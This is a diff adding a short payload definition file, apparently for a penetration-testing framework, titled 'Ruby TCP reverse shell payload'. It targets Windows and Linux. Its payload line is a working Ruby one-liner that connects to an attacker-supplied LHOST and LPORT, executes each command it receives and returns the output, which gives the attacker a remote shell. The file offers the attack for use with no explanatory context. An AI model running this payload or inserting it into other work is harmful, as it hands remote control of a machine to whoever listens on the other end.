@@ -1,0 +1,5 @@
+title=Ruby TCP reverse shell payload
+info=Should work with Win (Also Linux)
+required_opts=LHOST;LPORT
+connector=reverse_tcp_netcat
+payload=ruby -rsocket -e 'c=TCPSocket.new("LHOST","LPORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
